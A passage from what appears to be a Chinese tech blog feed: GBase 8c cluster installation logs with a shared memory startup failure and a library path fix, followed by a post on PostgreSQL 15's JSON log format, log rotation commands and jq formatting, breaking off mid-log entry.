[unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  Set max backend reserve memory is: 660 MB, max dynamic memory is: 6554 MB\n2023-03-15 00:01:31.530 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  shared memory 4049 Mbytes, memory context 7214 Mbytes, max process memory 12288 Mbytes\n2023-03-15 00:01:31.532 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 42809  0 [BACKEND] FATAL:  could not create shared memory segment: Cannot allocate memory\n2023-03-15 00:01:31.532 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 42809  0 [BACKEND] DETAIL:  Failed system call was shmget(key=5432001, size=4246569008, 03600).\n2023-03-15 00:01:31.532 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 42809  0 [BACKEND] HINT:  This error usually means that openGauss&#x27;s request for a shared memory segment exceeded available memory or swap space, or exceeded your kernel&#x27;s SHMALL parameter.  You can either reduce the request size or reconfigure the kernel with larger SHMALL.  To reduce the request size (currently 4246569008 bytes), reduce openGauss&#x27;s shared memory usage, perhaps by reducing shared_buffers.\n\tThe openGauss documentation contains more information about shared memory configuration.\n2023-03-15 00:01:31.532 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 42809  0 [BACKEND] BACKTRACELOG:  tid[17811]&#x27;s backtrace:\n\t/home/gbase/gbase_db/app/bin/gaussdb(+0xf21792) [0x5616ec545792]\n\t/home/gbase/gbase_db/app/bin/gaussdb(_Z9errfinishiz+0x391) [0x5616ec53b9d1]\n\t/home/gbase/gbase_db/app/bin/gaussdb(+0xcd7e5c) [0x5616ec2fbe5c]\n\t/home/gbase/gbase_db/app/bin/gaussdb(_Z20PGSharedMemoryCreatembi+0x5a) [0x5616ec2fc21a]\n\t/home/gbase/gbase_db/app/bin/gaussdb(_Z31CreateSharedMemoryAndSemaphoresbi+0x229) [0x5616ed236929]\n\t/home/gbase/gbase_db/app/bin/gaussdb(_Z14PostmasterMainiPPc+0x1757) [0x5616ecab0697]\n\t/home/gbase/gbase_db/app/bin/gaussdb(main+0x3ef) [0x5616ec04d06f]\n\t/lib64/libc.so.6(__libc_start_main+0xf5) [0x7f32a5217555]\n\t/home/gbase/gbase_db/app/bin/gaussdb(+0xa9dea7) [0x5616ec0c1ea7]\n\tUse addr2line to get pretty function name and line\n\t\n2023-03-15 00:01:31.540 64109a5b.1 [unknown] 139855609926080 [unknown] 0 cn1 00000  0 [BACKEND] LOG:  FiniNuma allocIndex: 0.\n[2023-03-15 00:01:32.281][17808][][gs_ctl]: waitpid 17811 failed, exitstatus is 256, ret is 2\n\n[2023-03-15 00:01:32.281][17808][][gs_ctl]: stopped waiting\n[2023-03-15 00:01:32.281][17808][][gs_ctl]: could not start server\nExamine the log output.\n[SUCCESS] gbase8c_2.shawnyan.com:\nUsing gbase:gbase to install database.\nUsing installation program path : /home/gbase/gbase_db/app_89583529\n$GAUSSHOME points to /home/gbase/gbase_db/app_89583529, no need to create symbolic link.\n[2023-03-15 00:01:28.500][10336][][gs_ctl]: gs_ctl started,datadir is /home/gbase/data/dn1/dn1_1 \n[2023-03-15 00:01:28.601][10336][][gs_ctl]: waiting for server to start...\n.0 LOG:  [Alarm Module]can not read GAUSS_WARNING_TYPE env.\n\t\n0 LOG:  [Alarm Module]Host Name: gbase8c_2.shawnyan.com \n\t\n0 LOG:  [Alarm Module]Host IP: 192.168.8.32 \n\t\n0 LOG:  [Alarm Module]Cluster Name: gbase \n\t\n0 LOG:  [Alarm Module]Invalid data in AlarmItem file! Read alarm English name failed! line: 57\n\t\n0 WARNING:  failed to open feature control file, please check whether it exists: FileName=gaussdb.version, Errno=2, Errmessage=No such file or directory.\n0 WARNING:  failed to parse feature control file: gaussdb.version.\n0 WARNING:  Failed to load the product control file, so gaussdb cannot distinguish product version.\nThe core dump path is an invalid directory\n2023-03-15 00:01:28.855 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 DB010  0 [REDO] LOG:  Recovery parallelism, cpu count = 2, max = 4, actual = 2\n2023-03-15 00:01:28.855 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 DB010  0 [REDO] LOG:  ConfigRecoveryParallelism, true_max_recovery_parallelism:4, max_recovery_parallelism:4\ngaussdb.state does not exist, and skipt setting since it is optional.2023-03-15 00:01:28.889 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  [Alarm Module]can not read GAUSS_WARNING_TYPE env.\n\t\n2023-03-15 00:01:28.889 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  [Alarm Module]Host Name: gbase8c_2.shawnyan.com \n\t\n2023-03-15 00:01:28.889 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  [Alarm Module]Host IP: 192.168.8.32 \n\t\n2023-03-15 00:01:28.889 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  [Alarm Module]Cluster Name: gbase \n\t\n2023-03-15 00:01:28.889 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  [Alarm Module]Invalid data in AlarmItem file! Read alarm English name failed! line: 57\n\t\n2023-03-15 00:01:28.894 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  loaded library \&quot;security_plugin\&quot;\n2023-03-15 00:01:28.895 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 01000  0 [BACKEND] WARNING:  could not create any HA TCP/IP sockets\n2023-03-15 00:01:28.895 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 01000  0 [BACKEND] WARNING:  could not create any HA TCP/IP sockets\n2023-03-15 00:01:28.946 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  InitNuma numaNodeNum: 1 numa_distribute_mode: none inheritThreadPool: 0.\n2023-03-15 00:01:28.946 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 01000  0 [BACKEND] WARNING:  Failed to initialize the memory protect for g_instance.attr.attr_storage.cstore_buffers (1024 Mbytes) or shared memory (3555 Mbytes) is larger.\n2023-03-15 00:01:29.022 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [CACHE] LOG:  set data cache  size(805306368)\n2023-03-15 00:01:29.060 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [CACHE] LOG:  set metadata cache  size(268435456)\n.2023-03-15 00:01:35.728 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [SEGMENT_PAGE] LOG:  Segment-page constants: DF_MAP_SIZE: 8156, DF_MAP_BIT_CNT: 65248, DF_MAP_GROUP_EXTENTS: 4175872, IPBLOCK_SIZE: 8168, EXTENTS_PER_IPBLOCK: 1021, IPBLOCK_GROUP_SIZE: 4090, BMT_HEADER_LEVEL0_TOTAL_PAGES: 8323072, BktMapEntryNumberPerBlock: 2038, BktMapBlockNumber: 25, BktBitMaxMapCnt: 512\n2023-03-15 00:01:36.337 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  gaussdb: fsync file \&quot;/home/gbase/data/dn1/dn1_1/gaussdb.state.temp\&quot; success\n2023-03-15 00:01:36.338 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  create gaussdb state file success: db state(STARTING_STATE), server mode(Normal), connection index(1)\n2023-03-15 00:01:36.360 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  max_safe_fds = 974, usable_fds = 1000, already_open = 16\nThe core dump path is an invalid directory\n2023-03-15 00:01:36.362 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  user configure file is not found, it will be created.\n2023-03-15 00:01:36.366 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  the configure file /home/gbase/gbase_db/app_89583529/etc/gscgroup_gbase.cfg doesn&#x27;t exist or the size of configure file has changed. Please create it by root user!\n2023-03-15 00:01:36.366 64109a58.1 [unknown] 140482339074496 [unknown] 0 dn1 00000  0 [BACKEND] LOG:  Failed to parse cgroup config file.\n.\n[2023-03-15 00:01:38.154][10336][][gs_ctl]:  done\n[2023-03-15 00:01:38.154][10336][][gs_ctl]: server started (/home/gbase/data/dn1/dn1_1)\n[SUCCESS] gbase8c_3.shawnyan.com:\nUsing gbase:gbase to install database.\nUsing installation program path : /home/gbase/gbase_db/app_89583529\n$GAUSSHOME points to /home/gbase/gbase_db/app_89583529, no need to create symbolic link.\n[2023-03-15 00:01:28.491][10228][][gs_ctl]: gs_ctl started,datadir is /home/gbase/data/dn2/dn2_1 \n[2023-03-15 00:01:28.611][10228][][gs_ctl]: waiting for server to start...\n.0 LOG:  [Alarm Module]can not read GAUSS_WARNING_TYPE env.\n\t\n0 LOG:  [Alarm Module]Host Name: gbase8c_3.shawnyan.com \n\t\n0 LOG:  [Alarm Module]Host IP: 192.168.8.33 \n\t\n0 LOG:  [Alarm Module]Cluster Name: gbase \n\t\n0 LOG:  [Alarm Module]Invalid data in AlarmItem file! Read alarm English name failed! line: 57\n\t\n0 WARNING:  failed to open feature control file, please check whether it exists: FileName=gaussdb.version, Errno=2, Errmessage=No such file or directory.\n0 WARNING:  failed to parse feature control file: gaussdb.version.\n0 WARNING:  Failed to load the product control file, so gaussdb cannot distinguish product version.\nThe core dump path is an invalid directory\n2023-03-15 00:01:28.838 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 DB010  0 [REDO] LOG:  Recovery parallelism, cpu count = 2, max = 4, actual = 2\n2023-03-15 00:01:28.838 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 DB010  0 [REDO] LOG:  ConfigRecoveryParallelism, true_max_recovery_parallelism:4, max_recovery_parallelism:4\ngaussdb.state does not exist, and skipt setting since it is optional.2023-03-15 00:01:28.859 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  [Alarm Module]can not read GAUSS_WARNING_TYPE env.\n\t\n2023-03-15 00:01:28.859 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  [Alarm Module]Host Name: gbase8c_3.shawnyan.com \n\t\n2023-03-15 00:01:28.859 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  [Alarm Module]Host IP: 192.168.8.33 \n\t\n2023-03-15 00:01:28.859 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  [Alarm Module]Cluster Name: gbase \n\t\n2023-03-15 00:01:28.859 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  [Alarm Module]Invalid data in AlarmItem file! Read alarm English name failed! line: 57\n\t\n2023-03-15 00:01:28.862 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  loaded library \&quot;security_plugin\&quot;\n2023-03-15 00:01:28.863 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 01000  0 [BACKEND] WARNING:  could not create any HA TCP/IP sockets\n2023-03-15 00:01:28.863 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 01000  0 [BACKEND] WARNING:  could not create any HA TCP/IP sockets\n2023-03-15 00:01:28.909 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  InitNuma numaNodeNum: 1 numa_distribute_mode: none inheritThreadPool: 0.\n2023-03-15 00:01:28.909 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 01000  0 [BACKEND] WARNING:  Failed to initialize the memory protect for g_instance.attr.attr_storage.cstore_buffers (1024 Mbytes) or shared memory (3555 Mbytes) is larger.\n2023-03-15 00:01:28.986 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [CACHE] LOG:  set data cache  size(805306368)\n2023-03-15 00:01:29.011 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [CACHE] LOG:  set metadata cache  size(268435456)\n.2023-03-15 00:01:35.841 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [SEGMENT_PAGE] LOG:  Segment-page constants: DF_MAP_SIZE: 8156, DF_MAP_BIT_CNT: 65248, DF_MAP_GROUP_EXTENTS: 4175872, IPBLOCK_SIZE: 8168, EXTENTS_PER_IPBLOCK: 1021, IPBLOCK_GROUP_SIZE: 4090, BMT_HEADER_LEVEL0_TOTAL_PAGES: 8323072, BktMapEntryNumberPerBlock: 2038, BktMapBlockNumber: 25, BktBitMaxMapCnt: 512\n2023-03-15 00:01:36.427 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  gaussdb: fsync file \&quot;/home/gbase/data/dn2/dn2_1/gaussdb.state.temp\&quot; success\n2023-03-15 00:01:36.427 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  create gaussdb state file success: db state(STARTING_STATE), server mode(Normal), connection index(1)\n2023-03-15 00:01:36.451 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  max_safe_fds = 974, usable_fds = 1000, already_open = 16\nThe core dump path is an invalid directory\n2023-03-15 00:01:36.452 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  user configure file is not found, it will be created.\n2023-03-15 00:01:36.457 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  the configure file /home/gbase/gbase_db/app_89583529/etc/gscgroup_gbase.cfg doesn&#x27;t exist or the size of configure file has changed. Please create it by root user!\n2023-03-15 00:01:36.457 64109a58.1 [unknown] 140525546086848 [unknown] 0 dn2 00000  0 [BACKEND] LOG:  Failed to parse cgroup config file.\n.\n[2023-03-15 00:01:38.242][10228][][gs_ctl]:  done\n[2023-03-15 00:01:38.242][10228][][gs_ctl]: server started (/home/gbase/data/dn2/dn2_1)\n]&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="安装完成后需要重新进入一次-gbase-用户，或者重新引入环境变量，否则无法找到二进制文件或者类包。">安装完成后需要重新进入一次 gbase 用户，或者重新引入环境变量，否则无法找到二进制文件或者类包。</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 script]$ gsql -d postgres -p 5432</span><br><span class="line">bash: gsql: command not found...</span><br><span class="line"></span><br><span class="line">[gbase@gbase8c_1 bin]$ ./gsql -d postgres -p 5432</span><br><span class="line">./gsql: error while loading shared libraries: libcjson.so.1: cannot open shared object file: No such file or directory</span><br><span class="line">[gbase@gbase8c_1 bin]$ ldd gsql</span><br><span class="line">...</span><br><span class="line">	libcjson.so.1 =&gt; not found</span><br><span class="line">	libcurl.so.4 =&gt; /lib64/libcurl.so.4 (0x00007fccb7acb000)</span><br><span class="line">	libgssapi_krb5_gauss.so.2 =&gt; not found</span><br><span class="line">	libgssrpc_gauss.so.4 =&gt; not found</span><br><span class="line">	libkrb5_gauss.so.3 =&gt; not found</span><br><span class="line">	libkrb5support_gauss.so.0 =&gt; not found</span><br><span class="line">	libk5crypto_gauss.so.3 =&gt; not found</span><br><span class="line">	libcom_err_gauss.so.3 =&gt; not found</span><br><span class="line">	libpq_ce.so.5 =&gt; not found</span><br><span class="line"></span><br><span class="line">--&gt; ldconfig, source ~/.bashrc</span><br></pre></td></tr></table></figure></div>
<hr>
<p>Have fun with GBase 8c ~</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/618721" >https://www.modb.pro/db/618721 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>GBase</category>
        <category>GBase 8c</category>
      </categories>
      <tags>
        <tag>gbase</tag>
        <tag>gdca</tag>
        <tag>南大通用</tag>
        <tag>gbase 8c</tag>
        <tag>国产数据库认证</tag>
      </tags>
  </entry>
  <entry>
    <title>【PG15】PostgreSQL 15 新日志格式 jsonlog</title>
    <url>/2023/postgresql/pg-15-jsonlog/</url>
    <content><![CDATA[<img  alt="day-by-day.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230308-7ef9ccd8-a46b-4e6f-ad6c-5794963b3e75.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="题记">题记</h2>
<p>对于某个技能点、知识点，没有实验或者没有质量的实验，都只是纸上谈兵。</p>
<p>今天在群里请教了一个问题，</p>
<p>pg里日志轮转有什么比较优雅的办法？<br>
手动触发日志轮转除了 pg_rotate_logfile()还有别的方法么？<br>
手动触发日志归档，而不用等定时轮转 log_roration_age，或者测试只看新的日志，我现在就只能把老的删掉，再触发生成新的。</p>
<p>当时的情况其实是，日志文件命名的粒度为“小时” (<code>log_filename = postgresql-%Y-%m-%d_%H.log</code>)。<br>
所以执行 pg_rotate_logfile 时，并没任何反应。</p>
<h2 id="日志轮转">日志轮转</h2>
<p>PostgreSQL 提供了两种方式进行日志轮转：</p>
<ol>
<li><code>pg_ctl logrotate</code> – PG工具，可在 postgres 用户直接执行，日志会自动轮转并生成新日志文件。也可以加 <code>-s</code> 参数，静默执行。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[postgres@centos7 log]$ pg_ctl logrotate</span><br><span class="line">server signaled to rotate log file</span><br><span class="line">[postgres@centos7 log]$ </span><br><span class="line">[postgres@centos7 log]$ pg_ctl logrotate -s</span><br><span class="line">[postgres@centos7 log]$ </span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li><code>pg_rotate_logfile()</code> – PG系统方法，需要 superuser 权限。</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(postgres@[<span class="keyword">local</span>]) [postgres] <span class="number">23</span>:<span class="number">01</span>:<span class="number">45</span># <span class="keyword">select</span> pg_rotate_logfile();</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> pg_rotate_logfile <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> t                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">[postgres<span class="variable">@centos7</span> log]$ psql <span class="operator">-</span>U sbtest <span class="operator">-</span>d postgres</span><br><span class="line">psql (<span class="number">15.2</span><span class="operator">-</span>Yan)</span><br><span class="line">Type &quot;help&quot; <span class="keyword">for</span> help.</span><br><span class="line"></span><br><span class="line">(sbtest@[<span class="keyword">local</span>]) [postgres] <span class="number">23</span>:<span class="number">03</span>:<span class="number">20</span><span class="operator">&gt;</span> <span class="keyword">select</span> pg_rotate_logfile();</span><br><span class="line">ERROR:  permission denied <span class="keyword">for</span> <span class="keyword">function</span> pg_rotate_logfile</span><br><span class="line"><span class="type">Time</span>: <span class="number">0.726</span> ms</span><br><span class="line">(sbtest@[<span class="keyword">local</span>]) [postgres] <span class="number">23</span>:<span class="number">03</span>:<span class="number">53</span><span class="operator">&gt;</span> \dg</span><br><span class="line">                                    List <span class="keyword">of</span> roles</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------------------------------------------------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> Role name <span class="operator">|</span>                         Attributes                         <span class="operator">|</span> <span class="keyword">Member</span> <span class="keyword">of</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------------------------------------------------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> postgres  <span class="operator">|</span> Superuser, <span class="keyword">Create</span> role, <span class="keyword">Create</span> DB, Replication, Bypass RLS <span class="operator">|</span> &#123;&#125;        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sbtest    <span class="operator">|</span>                                                            <span class="operator">|</span> &#123;&#125;        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------------------------------------------------------+-----------+</span></span><br></pre></td></tr></table></figure></div>
<p>不过，需要注意，需要 PostgreSQL 已经开启 <code>logging_collector</code>。</p>
<p>此外，还可以通过插件 <code>adminpack</code> 或者 pgAdmin 工具进行日志文件管理。</p>
<p>再者，可以使用操作系统层工具 logrotate 对日志文件进行定时轮转。</p>
<h2 id="一般-JSON-日志">一般 JSON 日志</h2>
<p>JSON 格式的日志非常适合记录结构化数据，因为它易于读取和处理。另外，由于 JSON 格式的日志只是普通的文本文件，所以可以使用任何文本编辑器或命令行工具来查看和处理。<br>
以下是一个示例 JSON 格式的日志条目：</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-02-23T14:30:00Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;INFO&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;User login&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ip_address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.1.1&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>在这个示例中，日志包含了时间戳、日志级别、事件消息、用户ID和IP地址。这些属性可以通过解析JSON格式的日志条目来轻松地提取和分析。<br>
使用 JSON 格式的日志有许多优点，例如易于使用、易于读取和解析、可扩展性好等。因此，JSON 格式的日志在现代应用程序中非常流行。</p>
<p>这里介绍一个格式化 JSON 的工具 - - <code>jq</code>。</p>
<p>jq 可以以各种方式转换 JSON，可以选择、迭代、缩减或分解 JSON 文档。例如，运行命令 <code>jq ´map(.price) | add´</code> 将接受一个 JSON 对象数组作为输入，并返回它们的 “price” 字段的和。<br>
jq 也可以接受文本输入，但默认情况下，jq 从 stdin 读取 JSON 实体流(包括数字和其他文字)。<br>
例如，上例就可由 jq 将普通文本从 stdin 读取，并进行格式化。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;&#123;&quot;timestamp&quot;: &quot;2022-02-23T14:30:00Z&quot;,&quot;level&quot;: &quot;INFO&quot;,&quot;message&quot;: &quot;User login&quot;,&quot;user_id&quot;: &quot;1234&quot;,&quot;ip_address&quot;: &quot;192.168.1.1&quot;&#125;&#x27;</span> | jq</span> </span><br><span class="line">&#123;</span><br><span class="line">  &quot;timestamp&quot;: &quot;2022-02-23T14:30:00Z&quot;,</span><br><span class="line">  &quot;level&quot;: &quot;INFO&quot;,</span><br><span class="line">  &quot;message&quot;: &quot;User login&quot;,</span><br><span class="line">  &quot;user_id&quot;: &quot;1234&quot;,</span><br><span class="line">  &quot;ip_address&quot;: &quot;192.168.1.1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="PostgreSQL-15-中的-jsonlog-日志文件">PostgreSQL 15 中的 jsonlog 日志文件</h2>
<p>JSON 格式的日志文件，是 PostgreSQL 15 的新特性之一<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>。</p>
<blockquote>
<p>PostgreSQL 15 contains many new features and enhancements, including:<br>
…<br>
Support for structured server log output using the JSON format.<br>
…<br>
Allow log output in JSON format (Sehrope Sarkuni, Michael Paquier)<br>
The new setting is log_destination = jsonlog.</p>
</blockquote>
<p><strong>“实践是检验真理的唯一标准”</strong></p>
<p>先来看日志输出格式示例：</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-03-08 20:29:31.596 CST&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pid&quot;</span><span class="punctuation">:</span><span class="number">1254</span><span class="punctuation">,</span><span class="attr">&quot;session_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;64087fab.4e6&quot;</span><span class="punctuation">,</span><span class="attr">&quot;line_num&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;session_start&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-03-08 20:29:31 CST&quot;</span><span class="punctuation">,</span><span class="attr">&quot;txid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;error_severity&quot;</span><span class="punctuation">:</span><span class="string">&quot;LOG&quot;</span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;ending log output to stderr&quot;</span><span class="punctuation">,</span><span class="attr">&quot;hint&quot;</span><span class="punctuation">:</span><span class="string">&quot;Future log output will go to log destination \&quot;csvlog, jsonlog\&quot;.&quot;</span><span class="punctuation">,</span><span class="attr">&quot;backend_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;postmaster&quot;</span><span class="punctuation">,</span><span class="attr">&quot;query_id&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-03-08 20:54:29.431 CST&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pid&quot;</span><span class="punctuation">:</span><span class="number">1945</span><span class="punctuation">,</span><span class="attr">&quot;remote_host&quot;</span><span class="punctuation">:</span><span class="string">&quot;192.168.8.121&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remote_port&quot;</span><span class="punctuation">:</span><span class="number">47620</span><span class="punctuation">,</span><span class="attr">&quot;session_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;64088585.799&quot;</span><span class="punctuation">,</span><span class="attr">&quot;line_num&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;ps&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;session_start&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-03-08 20:54:29 CST&quot;</span><span class="punctuation">,</span><span class="attr">&quot;txid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;error_severity&quot;</span><span class="punctuation">:</span><span class="string">&quot;LOG&quot;</span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;connection received: host=192.168.8.121 port=47620&quot;</span><span class="punctuation">,</span><span class="attr">&quot;backend_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;not initialized&quot;</span><span class="punctuation">,</span><span class="attr">&quot;query_id&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-03-08 20:54:29.432 CST&quot;</span><span class="punctuation">,</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;sbtest&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dbname&quot;</span><span class="punctuation">:</span><span class="string">&quot;postgres&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pid&quot;</span><span class="punctuation">:</span><span class="number">1945</span><span class="punctuation">,</span><span class="attr">&quot;remote_host&quot;</span><span class="punctuation">:</span><span class="string">&quot;192.168.8.121&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remote_port&quot;</span><span class="punctuation">:</span><span class="number">47620</span><span class="punctuation">,</span><span class="attr">&quot;session_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;64088585.799&quot;</span><span class="punctuation">,</span><span class="attr">&quot;line_num&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;ps&quot;</span><span class="punctuation">:</span><span class="string">&quot;authentication&quot;</span><span class="punctuation">,</span><span class="attr">&quot;session_start&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-03-08 20:54:29 CST&quot;</span><span class="punctuation">,</span><span class="attr">&quot;vxid&quot;</span><span class="punctuation">:</span><span class="string">&quot;3/83&quot;</span><span class="punctuation">,</span><span class="attr">&quot;txid&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;error_severity&quot;</span><span class="punctuation">:</span><span class="string">&quot;LOG&quot;</span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;connection authorized: user=sbtest database=postgres application_name=psql&quot;</span><span class="punctuation">,</span><span class="attr">&quot;backend_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;client backend&quot;</span><span class="punctuation">,</span><span class="attr">&quot;query_id&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-03-08 20:54:29.434 CST&quot;</span><span 